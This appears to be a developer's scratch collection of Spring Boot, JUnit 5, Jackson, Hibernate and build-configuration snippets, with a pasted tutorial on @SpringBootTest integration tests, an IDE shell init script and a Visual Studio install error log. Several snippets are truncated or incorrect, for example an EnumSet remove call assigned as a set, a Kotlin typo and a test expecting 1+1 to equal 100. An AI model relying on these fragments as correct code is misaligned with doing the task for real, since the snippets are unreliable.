//@AnalyzerDef(name = "orderanalyzer", tokenizer = @TokenizerDef(factory = StandardTokenizerFactory.class),
//        filters = {
//            @TokenFilterDef(factory = LowerCaseFilterFactory.class)
//            ,
//            @TokenFilterDef(factory = SnowballPorterFilterFactory.class, params = {
//        @Parameter(name = "language", value = "English"),}
//            )
//            ,
//            @TokenFilterDef(factory = SynonymFilterFactory.class, params = {
//        @Parameter(name = "ignoreCase", value = "true")
//        ,
//        @Parameter(name = "expand", value = "true")
//        ,
//        @Parameter(name = "synonyms", value = "syntest.txt")
//    })
//        }
//)
Field <uuId> is only allowed in the format of globally unique identifier
-------------------------------------------------------------------------------------------------------
//    @UID(message = "Field <uuId> is only allowed in the format of globally unique identifier")
////    @Column(name = "uuid", unique = true, nullable = false, updatable = false)
////    //@GeneratedValue(generator = "UUID")
////    //@GeneratedValue(generator = "uuid2")
////    @GeneratedValue(generator="hibernate-uuid.hex")
////    @GenericGenerator(name="hibernate-uuid.hex", strategy="uuid.hex")
////    //@GenericGenerator(name = "UUID", strategy = "org.hibernate.id.UUIDGenerator")
////    //@GenericGenerator(name = "uuid", strategy = "uuid2")
//    @Type(type = "uuid-char")
//    private UUID uuId;
-------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.MessageSource;
import org.springframework.context.support.MessageSourceAccessor;
import org.springframework.stereotype.Component;

import javax.annotation.PostConstruct;
import java.util.Locale;

/**
 * Helper to simplify accessing i18n messages in code.
 * 
 * This finds messages automatically found from src/main/resources (files named messages_*.properties)
 * 
 * This example uses hard-coded English locale.
 *
 * @author Joni Karppinen
 * @since 2015-11-02
 */
@Component
public class Messages {

    @Autowired
    private MessageSource messageSource;

    private MessageSourceAccessor accessor;

    @PostConstruct
    private void init() {
        accessor = new MessageSourceAccessor(messageSource, Locale.ENGLISH);
    }

    public String get(String code) {
        return accessor.getMessage(code);
    }
}
-------------------------------------------------------------------------------------------------------
EnumSet<Animal> featheredFlyingAnimals = 
    EnumSet.copyOf( flyingAnimals ).remove( BAT );
-------------------------------------------------------------------------------------------------------
    public static <T extends Comparable<? super T>> int checkRange(
        Type type,
        T min,
        T max) {

        int comparison = min.compareTo(max);
        if (comparison > 0) {
            throw new IllegalArgumentException(
                format(
                    "bad range, %" + type.pattern + " > %" + type.pattern,
                    min,
                    max));
        }
        return comparison;
    }
-------------------------------------------------------------------------------------------------------
//    /**
//     * Returns {@link BeanFactoryPostProcessor} instance
//     *
//     * @return {@link BeanFactoryPostProcessor} instance
//     */
//    @Bean
//    @ConditionalOnMissingBean
//    @ConditionalOnClass(EnumAutowiringBeanFactoryPostProcessor.class)
//    @Description("Kafka enum autowiring factory bean")
//    public BeanFactoryPostProcessor postProcessor() {
//        return new EnumAutowiringBeanFactoryPostProcessor(
//            KafkaConsumerAutoOffsetResetType.class,
//            KafkaProducerAcknowledgementType.class,
//            KafkaProducerCompressionType.class
//        );
//    }
-------------------------------------------------------------------------------------------------------
@Configuration
public class RetryTemplateBeanPostProcessor implements BeanPostProcessor {
    /**
     * Default retry bean name
     */
    private static final String DEFAULT_RETRY_TEMPLATE_BEAN_NAME = "retryTemplate";

    /**
     * @see BeanPostProcessor
     */
    @Nullable
    @Override
    public Object postProcessAfterInitialization(@NonNull final Object bean, @NonNull final String beanName) {
        if (equalsIgnoreCase(beanName, DEFAULT_RETRY_TEMPLATE_BEAN_NAME) && isAssignable(bean.getClass(), RetryTemplate.class)) {
            ((RetryTemplate) bean).setThrowLastExceptionOnExhausted(true);
        }
        return bean;
    }
}
-------------------------------------------------------------------------------------------------------
buildscript {
	 ext {
		springBootVersion = '1.5.9.RELEASE'
	 }
	 
    repositories {
		mavenLocal()
        mavenCentral()
    }
	
    dependencies {
        classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}")
    }
}

apply plugin: 'java'
apply plugin: 'org.springframework.boot'

sourceCompatibility = 1.8
targetCompatibility = 1.8

repositories {
 mavenLocal()
    mavenCentral()
}

dependencies {
	compile("org.springframework.boot:spring-boot-starter-web:${springBootVersion}")
	compile('org.apache.tomcat.embed:tomcat-embed-jasper:8.5.14')
    compile('javax.servlet:jstl:1.2')
}
-------------------------------------------------------------------------------------------------------
mport static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.when;
import java.io.IOException;
import java.util.List;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.web.client.RestTemplate;
import static org.assertj.core.api.Assertions.assertThat;
import com.mgiglione.model.Manga;
import com.mgiglione.model.MangaResult;
import com.mgiglione.service.MangaService;
import com.mgiglione.utils.JsonUtils;
@RunWith(SpringRunner.class)
@SpringBootTest
public class MangaServiceUnitTest {
    @Autowired
    private MangaService mangaService;
    // MockBean is the annotation provided by Spring that wraps mockito one
    // Annotation that can be used to add mocks to a Spring ApplicationContext.
    // If any existing single bean of the same type defined in the context will be replaced by the mock, if no existing bean is defined a new one will be added.
    @MockBean
    private RestTemplate template;
    @Test
    public void testGetMangasByTitle() throws IOException {
        // Parsing mock file
        MangaResult mRs = JsonUtils.jsonFile2Object("ken.json", MangaResult.class);
        // Mocking remote service
        when(template.getForEntity(any(String.class), any(Class.class))).thenReturn(new ResponseEntity(mRs, HttpStatus.OK));
        // I search for goku but system will use mocked response containing only ken, so I can check that mock is used.
        List<Manga> mangasByTitle = mangaService.getMangasByTitle("goku");
        assertThat(mangasByTitle).isNotNull()
            .isNotEmpty()
            .allMatch(p -> p.getTitle()
                .toLowerCase()
                .contains("ken"));
    }
}
-------------------------------------------------------------------------------------------------------
	public static void main(String[] args) throws Exception {
		SpringApplication app = new SpringApplication(SampleSimpleApplication.class);
		app.addInitializers(
				new ApplicationContextInitializer<ConfigurableApplicationContext>() {

					@Override
					public void initialize(
							ConfigurableApplicationContext applicationContext) {
						applicationContext.getBeanFactory().registerSingleton(
								"mytypefilter", new TypeExcludeFilter() {

							@Override
							public boolean match(MetadataReader metadataReader,
									MetadataReaderFactory metadataReaderFactory)
											throws IOException {
								System.err.println(
										metadataReader.getClassMetadata().getClassName());
								return false;
							}

						});
					}

				});
		app.run(args);
	}
	
	Spring Boot
Java
Software Craft
Book Reviews
Meta
SPRING BOOT
Integration Tests with @SpringBootTest
With the @SpringBootTest annotation, Spring Boot provides a convenient way to start up an application context to be used in a test. In this tutorial, we’ll discuss when to use @SpringBootTest and when to better use other tools for testing. We’ll also look into different ways to customize the application context and how to reduce test runtime.

 Code Example
This article is accompanied by working example code on GitHub.

The “Testing with Spring Boot” Series
This tutorial is part of a series:

Unit Testing with Spring Boot
Testing Spring MVC Web Controllers with @WebMvcTest
Testing JPA Queries with @DataJpaTest
Integration Tests with @SpringBootTest
Dependencies
The code examples in this article only need the dependencies to Spring Boot’s test starter and to JUnit Jupiter:

dependencies {
	testCompile('org.springframework.boot:spring-boot-starter-test')
	testCompile('org.junit.jupiter:junit-jupiter:5.4.0')
}
Integration Tests vs. Unit Tests
Before we start into integration tests with Spring Boot, let’s define what sets an integration test apart from a unit test.

A unit test covers a single “unit”, where a unit commonly is a single class, but can also be a cluster of cohesive classes that is tested in combination.

An integration test can be any of the following:

a test that covers multiple “units”. It tests the interaction between two or more clusters of cohesive classes.
a test that covers multiple layers. This is actually a specialization of the first case and might cover the interaction between a business service and the persistence layer, for instance.
a test that covers the whole path through the application. In these tests, we send a request to the application and check that it responds correctly and has changed the database state according to our expectations.
Spring Boot provides the @SpringBootTest annotation which we can use to create an application context containing all the objects we need for all of the above test types. Note, however, that overusing @SpringBootTest might lead to very long-running test suites.

So, for simple tests that cover multiple units we should rather create plain tests, very similar to unit tests, in which we manually create the object graph needed for the test and mock away the rest. This way, Spring doesn’t fire up a whole application context each time the test is started.

For tests that cover integration with the web layer or persistence layer, we can use @WebMvcTest or @DataJpaTest instead. For integration with other layers, have a look at Spring Boot’s other test slice annotations. Note that these test slices will also take some time to boot up, though.

Finally, for tests that cover the whole Spring Boot application from incoming request to database, or tests that cover certain parts of the application that are hard to set up manually, we can and should use @SpringBootTest.

Creating an ApplicationContext with @SpringBootTest
@SpringBootTest by default starts searching in the current package of the test class and then searches upwards through the package structure, looking for a class annotated with @SpringBootConfiguration from which it then reads the configuration to create an application context. This class is usually our main application class since the @SpringBootApplication annotation includes the @SpringBootConfiguration annotation. It then creates an application context very similar to the one that would be started in a production environment.

We can customize this application context in many different ways, as described in the next section.

Because we have a full application context, including web controllers, Spring Data repositories, and data sources, @SpringBootTest is very convenient for integration tests that go through all layers of the application:

@ExtendWith(SpringExtension.class)
@SpringBootTest
@AutoConfigureMockMvc
class RegisterUseCaseIntegrationTest {

  @Autowired
  private MockMvc mockMvc;

  @Autowired
  private ObjectMapper objectMapper;

  @Autowired
  private UserRepository userRepository;

  @Test
  void registrationWorksThroughAllLayers() throws Exception {
    UserResource user = new UserResource("Zaphod", "zaphod@galaxy.net");

    mockMvc.perform(post("/forums/{forumId}/register", 42L)
            .contentType("application/json")
            .param("sendWelcomeMail", "true")
            .content(objectMapper.writeValueAsString(user)))
            .andExpect(status().isOk());

    UserEntity userEntity = userRepository.findByName("Zaphod");
    assertThat(userEntity.getEmail()).isEqualTo("zaphod@galaxy.net");
  }

}
@ExtendWith
The code examples in this tutorial use the @ExtendWith annotation to tell JUnit 5 to enable Spring support. As of Spring Boot 2.1, we no longer need to load the SpringExtension because it's included as a meta annotation in the Spring Boot test annotations like @DataJpaTest, @WebMvcTest, and @SpringBootTest.

Here, we additionally use @AutoConfigureMockMvc to add a MockMvc instance to the application context.

We use this MockMvc object to perform a POST request to our application and to verify that it responds as expected.

We then use the UserRepository from the application context to verify that the request has lead to an expected change in the state of the database.

Customizing the Application Context
We can turn a lot of knobs to customize the application context created by @SpringBootTest. Let’s see which options we have.

Caution when Customizing the Application Context
Each customization of the application context is one more thing that makes it different from the "real" application context that is started up in a production setting. So, in order to make our tests as close to production as we can, we should only customize what's really necessary to get the tests running!

Adding Auto-Configurations
Above, we’ve already seen an auto-configuration in action:

@SpringBootTest
@AutoConfigureMockMvc
class RegisterUseCaseIntegrationTest {
  ...
}
There’s a lot of other auto-configurations available that each add other beans to the application context.

Setting Custom Configuration Properties
Often, in tests it’s necessary to set some configuration properties to a value that’s different from the value in a production setting:

@SpringBootTest(properties = "foo=bar")
class SpringBootPropertiesTest {

  @Value("${foo}")
  String foo;

  @Test
  void test(){
    assertThat(foo).isEqualTo("bar");
  }
}
If the property foo exists in the default setting, it will be overridden by the value bar for this test.

Externalizing Properties with @ActiveProfiles
If many of our tests need the same set of properties, we can create a configuration file application-<profile>.properties or application-<profile>.yml and load the properties from that file by activating a certain profile:

# application-test.yml
foo: bar
@SpringBootTest
@ActiveProfiles("test")
class SpringBootProfileTest {

  @Value("${foo}")
  String foo;

  @Test
  void test(){
    assertThat(foo).isEqualTo("bar");
  }
}
Setting Custom Properties with @TestPropertySource
Another way to customize a whole set of properties is with the @TestPropertySource annotation:

# src/test/resources/foo.properties
foo=bar
@SpringBootTest
@TestPropertySource(locations = "/foo.properties")
class SpringBootPropertySourceTest {

  @Value("${foo}")
  String foo;

  @Test
  void test(){
    assertThat(foo).isEqualTo("bar");
  }
}
All properties from the foo.properties file are loaded into the application context. @TestPropertySource also to configure a lot more.

Injecting Mocks with @MockBean
If we only want to test a certain part of the application instead of the whole path from incoming request to database, we can replace certain beans in the application context by using @MockBean:

@SpringBootTest
class MockBeanTest {

  @MockBean
  private UserRepository userRepository;

  @Autowired
  private RegisterUseCase registerUseCase;

  @Test
  void testRegister(){
    // given
    User user = new User("Zaphod", "zaphod@galaxy.net");
    boolean sendWelcomeMail = true;
    given(userRepository.save(any(UserEntity.class))).willReturn(userEntity(1L));

    // when
    Long userId = registerUseCase.registerUser(user, sendWelcomeMail);

    // then
    assertThat(userId).isEqualTo(1L);
  }
  
}
In this case, we have replaced the UserRepository bean with a mock. Using Mockito’s when method, we have specified the expected behavior for this mock in order to test a class that uses this repository.

You can read more about the @MockBean annotation in my article about mocking.

Adding Beans with @Import
If certain beans are not included in the default application context, but we need them in a test, we can import them using the @Import annotation:

package other.namespace;

@Component
public class Foo {
}
@SpringBootTest
@Import(other.namespace.Foo.class)
class SpringBootImportTest {

  @Autowired
  Foo foo;

  @Test
  void test() {
    assertThat(foo).isNotNull();
  }
}
By default, a Spring Boot application includes all components it finds within its package and sub-packages, so this will usually only be needed if we want to include beans from other packages.

Creating a Custom @SpringBootApplication
We can even create a whole custom Spring Boot application to start up in tests. If this application class is in the same package as the real application class, but in the test sources rather than the production sources, @SpringBootTest will find it before the actual application class and load the application context from this application instead.

Alternatively, we can tell Spring Boot which application class to use to create an application context:

@SpringBootTest(classes = CustomApplication.class)
class CustomApplicationTest {

}
When doing this, however, we’re testing an application context that may be completely different from the production environment, so this should be a last resort only when the production application cannot be started in a test environment. Usually, there are better ways, though, such as to make the real application context configurable to exclude beans that won’t start in a test environment. Let’s look at this in an example.

Let’s say we use the @EnableScheduling annotation on our application class. Each time the application context is started (even in tests), all @Scheduled jobs will be started and may conflict with our tests. We usually don’t want the jobs to run in tests, so we can create a second application class without the @EnabledScheduling annotation and use this in the tests. However, the better solution would be to create a configuration class that can be toggled with a property:

@Configuration
@EnableScheduling
@ConditionalOnProperty(
        name = "io.reflectoring.scheduling.enabled",
        havingValue = "true",
        matchIfMissing = true)
public class SchedulingConfiguration {
}@SpringBootTest(properties = "io.reflectoring.scheduling.enabled=false")
class SchedulingTest {

  @Autowired(required = false)
  private SchedulingConfiguration schedulingConfiguration;

  @Test
  void test() {
    assertThat(schedulingConfiguration).isNull();
  }
}


import com.fasterxml.jackson.annotation.JsonGetter;
public class GetterDemoBean {
    public long personId = 123L;
    public String  personName = "James Clark";
    @JsonGetter(value = "person-id")
    public long getPersonId() {
        return personId;
    }
    @JsonGetter(value = "person-name")
    public String getPersonName() {
        return personName;
    }
}
import com.fasterxml.jackson.annotation.JsonAnyGetter;
import java.util.HashMap;
import java.util.Map;
public class AnyGetterDemoBean {
    public long personId = 123L;
    public String  personName = "James Clark";
    private Map<String, String> properties = new HashMap<String, String>();
    @JsonAnyGetter
    public Map<String, String> getProperties() {
        return properties;
    }
}


import com.fasterxml.jackson.databind.annotation.JsonSerialize;
import guru.springframework.blog.jsonannotation.domain.custom.CustomDateSerializer;
import java.util.Date;
public class SerializeDemoBean {
    public long personId = 123L;
    public String  name = "James Clark";
    @JsonSerialize(using = CustomDateSerializer.class)
    public Date activeDate;
    public void setActiveDate(Date activeDate) {
        this.activeDate = activeDate;
    }
}

import com.fasterxml.jackson.core.JsonGenerationException;
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.std.StdSerializer;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
public class CustomDateSerializer extends StdSerializer<Date>{
    private static SimpleDateFormat simpleDateFormat =
            new SimpleDateFormat("dd-MM-yyyy hh:mm:ss");
    public CustomDateSerializer(){
        this(null);
    }
    public CustomDateSerializer(Class<Date> t) {
        super(t);
    }
    @Override
    public void serialize(Date date, JsonGenerator jsonGenerator,
                          SerializerProvider serializerProvider) throws IOException {
        jsonGenerator.writeString(simpleDateFormat.format(date));
    }
}
-------------------------------------------------------------------------------------------------------
//pom.xml
 
<properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>${maven.compiler.source}</maven.compiler.target>
    <junit.jupiter.version>5.5.2</junit.jupiter.version>
    <junit.platform.version>1.5.2</junit.platform.version>
</properties>
<dependencies>
    <dependency>
        <groupId>org.junit.jupiter</groupId>
        <artifactId>junit-jupiter-engine</artifactId>
        <version>${junit.jupiter.version}</version>
        <scope>test</scope>
    </dependency>
    <dependency>
        <groupId>org.junit.platform</groupId>
        <artifactId>junit-platform-runner</artifactId>
        <version>${junit.platform.version}</version>
        <scope>test</scope>
    </dependency>
</dependencies>
 
//build.gradle
 
testRuntime("org.junit.jupiter:junit-jupiter-engine:5.5.2")
testRuntime("org.junit.platform:junit-platform-runner:1.5.2")
-------------------------------------------------------------------------------------------------------

public List<User> findAll(List<String> userIds) {
    return userIds.stream()
        .map(userRepository::findById)
        .flatMap(Optional::stream)
        .collect(Collectors.toList());
}

var user : User = null // does not compile, user is non-nullable
var nullableUser : User? = null // declares and assigns null to nullableUser
val name = nullableUser.name // does not compile. Either use  '?.' or '!!'
var lastName = nullableUser?.lastName // returns null since  nullableUser is null
val email = nullableUser!!email // compiles, but throws NullPointerException on runtime
lastName = nullableUser?.lastName ?: "" // returns an empty string.

@IncludePackages and @ExcludePackages to filter packages
@IncludeClassNamePatterns and @ExcludeClassNamePatterns to filter test classes
@IncludeTags and @ExcludeTags to filter test methods
-------------------------------------------------------------------------------------------------------
@XmlRootElement(name = "employee")
@XmlAccessorType(XmlAccessType.NONE)
public class EmployeeVO extends ResourceSupport implements Serializable
{
    //rest all code is same
}
 
//...
 
@XmlRootElement (name="employees")
public class EmployeeListVO extends ResourceSupport implements Serializable
{
    //rest all code is same
}
 
//...
 
@XmlRootElement(name="employee-report")
public class EmployeeReport extends ResourceSupport implements Serializable {
 
    //rest all code is same
}
-------------------------------------------------------------------------------------------------------
#!/bin/bash

# mappings for Ctrl-left-arrow and Ctrl-right-arrow for word moving
bindkey '^[^[[C' forward-word
bindkey '^[^[[D' backward-word

ZDOTDIR=$_OLD_ZDOTDIR

if [ -n "$JEDITERM_USER_RCFILE" ]
then
  source "$JEDITERM_USER_RCFILE"
  unset JEDITERM_USER_RCFILE
fi

if [ -n "$ZDOTDIR" ]
then
  DOTDIR=$ZDOTDIR
else
  DOTDIR=$HOME
fi

if [ -f "$DOTDIR/.zshenv" ]; then
     source "$DOTDIR/.zshenv"
fi

if [ -n $LOGIN_SHELL ]; then
  if [ -f "$DOTDIR/.zprofile" ]; then
       source "$DOTDIR/.zprofile"
  fi
fi

if [ -f "$DOTDIR/.zshrc" ]; then
     source "$DOTDIR/.zshrc"
fi

if [ -n $LOGIN_SHELL ]; then
  if [ -f "$DOTDIR/.zlogin" ]; then
       source "$DOTDIR/.zlogin"
  fi
fi

if [ -n "$JEDITERM_SOURCE" ]
then
  source $(echo $JEDITERM_SOURCE) $JEDITERM_SOURCE_ARGS
  unset JEDITERM_SOURCE
  unset JEDITERM_SOURCE_ARGS
fi

function override_jb_variables {
  env | while IFS="=" read NAME VALUE
  do
    if [[ $NAME = '_INTELLIJ_FORCE_SET_'* ]]
    then
      NEW_NAME=${NAME:20}
      if [ -n "$NEW_NAME" ]
      then
        export "$NEW_NAME"="$VALUE"
      fi
    fi
  done
}

override_jb_variables
-------------------------------------------------------------------------------------------------------
SELECT 1 FROM pg_constraint WHERE conname = 'constraint_name'"
-------------------------------------------------------------------------------------------------------
package source; 
// A Java program to demonstrate user defined annotations 
import java.lang.annotation.Documented; 
import java.lang.annotation.Retention; 
import java.lang.annotation.RetentionPolicy; 
  
// user-defined annotation 
@Documented
@Retention(RetentionPolicy.RUNTIME) 
@ interface TestAnnotation 
{ 
    String Developer() default "Rahul";  
    String Expirydate(); 
} 
-------------------------------------------------------------------------------------------------------

@Retention(RetentionPolicy.RUNTIME)
@Repeatable(Demos.class)
public @interface Demo {
    String value() default "";
}

@Retention(RetentionPolicy.RUNTIME)
public @interface Demos {
    Demo[] value();
}

@Repeatable(Role.List.class)
@Target({ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
public @interface Role {
    String value();
    @Retention(RetentionPolicy.RUNTIME)
    @Target({ElementType.TYPE})
    @interface List {
        Role[] value();
    }
}



-------------------------------------------------------------------------------------------------------
Something went wrong with the install.

You can troubleshoot the package failures by:

    1. Search for solutions using the search URL below for each package failure
    2. Modify your selections for the affected workloads or components and then retry the installation
    3. Remove the product from your machine and then install again

If the issue has already been reported on the Developer Community, you can find solutions or workarounds there. If the issue has not been reported, we encourage you to create a new issue so that other developers will be able to find solutions or workarounds. You can create a new issue from within the Visual Studio Installer in the upper-right hand corner using the "Provide feedback" button.
https://dotnet.microsoft.com/download/dotnet-core/2.2
================================================================================
https://nuget.paragon-software.com/
https://nuget.paragon-software.com/nuget/Prerelease/
https://proget.paragon-software.com/maven2/Maven

Package 'Microsoft.VisualStudio.MinShell.Msi.Resources,version=16.0.28329.73,language=en-US' failed to install.
    Search URL
        https://aka.ms/VSSetupErrorReports?q=PackageId=Microsoft.VisualStudio.MinShell.Msi.Resources;PackageAction=Install;ReturnCode=1603
    Details
        MSI: C:\ProgramData\Microsoft\VisualStudio\Packages\Microsoft.VisualStudio.MinShell.Msi.Resources,version=16.0.28329.73,language=en-US\Microsoft.VisualStudio.MinShell.Msi.Resources.msi, Properties:  REBOOT=ReallySuppress ARPSYSTEMCOMPONENT=1  MSIFASTINSTALL="7"  VSEXTUI="1" 
        Return code: 1603
        Return code details: Fatal error during installation.
    Log
        C:\Users\rogalski\AppData\Local\Temp\dd_setup_20191014175343_001_Microsoft.VisualStudio.MinShell.Msi.Resources.log
    Impacted workloads
        Visual Studio core editor (Microsoft.VisualStudio.Workload.CoreEditor,version=16.0.28315.86)
    Impacted components
        Visual Studio core editor (Microsoft.VisualStudio.Component.CoreEditor,version=16.1.28811.260)

"C:\WINDOWS\system32\vsjitdebugger.exe" -p %ld -e %ld
"C:\WINDOWS\system32\vsjitdebugger.exe" -p %ld -e %ld
C:\Users\rogalski\.Rider2019.2\system\log\SolutionBuilder

-------------------------------------------------------------------------------------------------------
msbuild build\paragon.build.proj /t:GenerateDocumentation
nuget install docfx.console -o .build\docfx -x
.build\docfx\docfx.console\tools\docfx.exe doc\default\docfx.json --intermediateFolder .build\obj\docfx\.cache
-------------------------------------------------------------------------------------------------------
    /**
     * Returns {@link FileEntity} by input {@link FileSearchParameters} parameters
     *
     * @param fileSearchParameters - initial input {@link FileSearchParameters} to fetch by
     * @return {@link FileEntity}
     */
    @SuppressWarnings("unchecked")
    @Override
    public Optional<FileEntity> searchFileRecord(final FileSearchParameters fileSearchParameters) {
        log.info("Fetching file record by input search parameters: {}", fileSearchParameters);
//        final FullTextEntityManager fullTextEntityManager = this.getFullTextEntityManager();
//        final QueryBuilder querybuilder = this.getFullTextQueryBuilder(fullTextEntityManager, FileEntity.class);
//        final Query filePlatformQuery = querybuilder
//                .keyword()
//                //.fuzzy()
//                //.withEditDistanceUpTo(1)
//                //.withPrefixLength(1)
//                .onFields("fileInfo.filePlatform")
//                .matching(fileSearchParameters.getPlatform())
//                .createQuery();
//        final Query productSkuQuery = querybuilder
//                .keyword()
//                //.fuzzy()
//                //.withEditDistanceUpTo(1)
//                //.withPrefixLength(1)
//                .onFields("version.product.sku")
//                .matching(fileSearchParameters.getSku())
//                .createQuery();
//        final Query versionQuery = querybuilder
//                .keyword()
//                //.fuzzy()
//                //.withEditDistanceUpTo(1)
//                //.withPrefixLength(1)
//                .onFields("version.version")
//                .matching(this.buildVersionInfo(fileSearchParameters.getVersion()))
//                .createQuery();
//        final Query localeQuery = querybuilder
//                .keyword()
//                //.fuzzy()
//                //.withEditDistanceUpTo(1)
//                //.withPrefixLength(1)
//                .onFields("version.locales")
//                .matching(new LocaleEntity())
//                .createQuery();
//        final Query combinedQuery = querybuilder
//                .bool()
//                .must(filePlatformQuery)
//                .must(productSkuQuery)
//                .must(versionQuery)
//                .must(localeQuery)
//                .createQuery();
//        final javax.persistence.Query jpaQuery = fullTextEntityManager.createFullTextQuery(combinedQuery, FileEntity.class);
//        return Optional.of((FileEntity) jpaQuery.getSingleResult());

        final FileEntity fileEntity = this.getFileRecordByParameters(fileSearchParameters);
        if (StringUtils.isNotBlank(fileSearchParameters.getVersion())) {
            final VersionInfoEntity versionInfoEntity = this.buildVersionInfo(fileSearchParameters.getVersion());
            predicate.and(QFileEntity.fileEntity.version().versionInfo.eq(versionInfoEntity));
            return StreamSupport.stream(this.getFileRepository().findAll(predicate).spliterator(), false)
                    .filter(value -> value.getVersion().getLocales().stream().anyMatch(locale -> Objects.equals(locale, new LocaleInfoEntity(fileSearchParameters.getLocale()))))
                    .findFirst();
                    //.orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_BY_REQUEST_NOT_FOUND_MESSAGE_TEMPLATE, fileSearchParameters));
        }
        return StreamSupport.stream(this.getFileRepository().findAll(predicate).spliterator(), false)
                .filter(value -> value.getVersion().getLocales().stream().anyMatch(locale -> Objects.equals(locale, new LocaleInfoEntity(fileSearchParameters.getLocale()))))
                .max(Comparator.comparing(value -> value.getVersion().getVersionInfo()));
                //.orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_BY_REQUEST_NOT_FOUND_MESSAGE_TEMPLATE, fileSearchParameters));
    }
-------------------------------------------------------------------------------------------------------
@Test
void additionTest() {
    Calculator calc = new Calculator();
    assertAll(
        () -> assertEquals(100, calc.add(1,1), "Doesn't add two positive numbers properly"),
        () -> assertEquals(100, calc.add(-1,1), "Doesn't add a negative and a positive number properly"),
        () -> assertNotNull(calc, "The calc variable should be initialized")
    );
}
-------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------
<build>
    <plugins>
        <plugin>
            <artifactId>maven-surefire-plugin</artifactId>
            <version>2.22.2</version>
            <configuration>
                <groups>acceptance | !feature-a</groups>
                <excludedGroups>integration, regression</excludedGroups>
            </configuration>
        </plugin>
    </plugins>
</build>
-------------------------------------------------------------------------------------------------------
spring:
  application:
    name: Spring Boot Rest API
  datasource:
    type: com.zaxxer.hikari.HikariDataSource
    url: "jdbc:h2:mem:test-api;INIT=CREATE SCHEMA IF NOT EXISTS dbo\\;CREATE SCHEMA IF NOT EXISTS definitions;DATABASE_TO_UPPER=false;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=false;MODE=MSSQLServer"
    name:
    password:
    username:
    initialization-mode: never
    hikari:
      schema: dbo
  jpa:
    database: H2
    database-platform: org.hibernate.dialect.H2Dialect
    show-sql: true
    hibernate:
      ddl-auto: create-drop
  test:
    database:
      replace: none
-------------------------------------------------------------------------------------------------------
public static int safeLongToInt(long l) {
    if (l < Integer.MIN_VALUE || l > Integer.MAX_VALUE) {
        throw new IllegalArgumentException
            (l + " cannot be cast to int without changing its value.");
    }
    return (int) l;
}
-------------------------------------------------------------------------------------------------------
To include tags or tag expressions, use groups.
To exclude tags or tag expressions, use excludedGroups

...
<build>
    <plugins>
        ...
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-surefire-plugin</artifactId>
            <version>3.0.0-M4</version>
            <configuration>
                <groups>acceptance | !feature-a</groups>
                <excludedGroups>integration, regression</excludedGroups>
            </configuration>
        </plugin>
    </plugins>
</build>
-------------------------------------------------------------------------------------------------------
	<plugin>
				<artifactId>maven-compiler-plugin</artifactId>
				<version>3.7.0</version>
			</plugin>
			<plugin>
				<artifactId>maven-surefire-plugin</artifactId>
				<version>2.22.1</version>
				<configuration>
					<excludedGroups>database</excludedGroups>
					<properties>
						<!--<configurationParameters>-->
							<!--junit.jupiter.conditions.deactivate=*-->
						<!--</configurationParameters>-->
					</properties>
				</configuration>
			</plugin>
-------------------------------------------------------------------------------------------------------
@Test
@EnabledOnOs({ LINUX, SOLARIS }) // disabled on all but Linux, Solaris
@DisabledOnJre(JAVA_8)           // disabled on Java 8
@EnabledIfSystemProperty(        // disabled on all but 64bit OS
	named = "os.arch", matches = ".*64.*")
@EnabledIfEnvironmentVariable(   // disabled unless `ENV` is `ci`
	named = "ENV", matches = "ci")
void test() {
	// doesn't run on Linux with Java 10 because `@EnabledOnOs` doesn't
	// rellay _enable_ the test as much as _not disable_ it
}
-------------------------------------------------------------------------------------------------------
import org.junit.jupiter.api.Assumptions;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;
 
@Disabled
public class AppTest {
     
    @Test
    void testOnDev() 
    {
        System.setProperty("ENV", "DEV");
        Assumptions.assumeFalse("DEV".equals(System.getProperty("ENV")));
    }
     
    @Test
    void testOnProd() 
    {
        System.setProperty("ENV", "PROD");
        Assumptions.assumeFalse("DEV".equals(System.getProperty("ENV")));
    }
}
-------------------------------------------------------------------------------------------------------
import org.hibernate.annotations.Type
import java.util.UUID
import javax.persistence.Column
import javax.persistence.GeneratedValue
import javax.persistence.Id

@Id @GeneratedValue
@Type(type = "uuid-char") @Column(length = 36)
private UUID id;

@Id
@GeneratedValue(generator = "uuid2")
@GenericGenerator(name = "uuid2", strategy = "uuid2")
@Column(name = "uuid", columnDefinition = "BINARY(16)")
public UUID getId()
{
    return id;
}

public void setId(UUID i)
{
    id = i;
}

@Id
@GeneratedValue(generator="system-uuid")
@GenericGenerator(name="system-uuid", strategy = "uuid")
@Column(name = "uuid", unique = true)
private String uuid;


-------------------------------------------------------------------------------------------------------
//        final FullTextEntityManager fullTextEntityManager = this.getFullTextEntityManager();
//        final QueryBuilder querybuilder = this.getFullTextQueryBuilder(fullTextEntityManager, FileEntity.class);
//        final Query filePlatformQuery = querybuilder
//                .keyword()
//                //.fuzzy()
//                //.withEditDistanceUpTo(1)
//                //.withPrefixLength(1)
//                .onFields("fileInfo.filePlatform")
//                .matching(fileSearchParameters.getPlatform())
//                .createQuery();
//        final Query productSkuQuery = querybuilder
//                .keyword()
//                //.fuzzy()
//                //.withEditDistanceUpTo(1)
//                //.withPrefixLength(1)
//                .onFields("version.product.sku")
//                .matching(fileSearchParameters.getSku())
//                .createQuery();
//        final Query versionQuery = querybuilder
//                .keyword()
//                //.fuzzy()
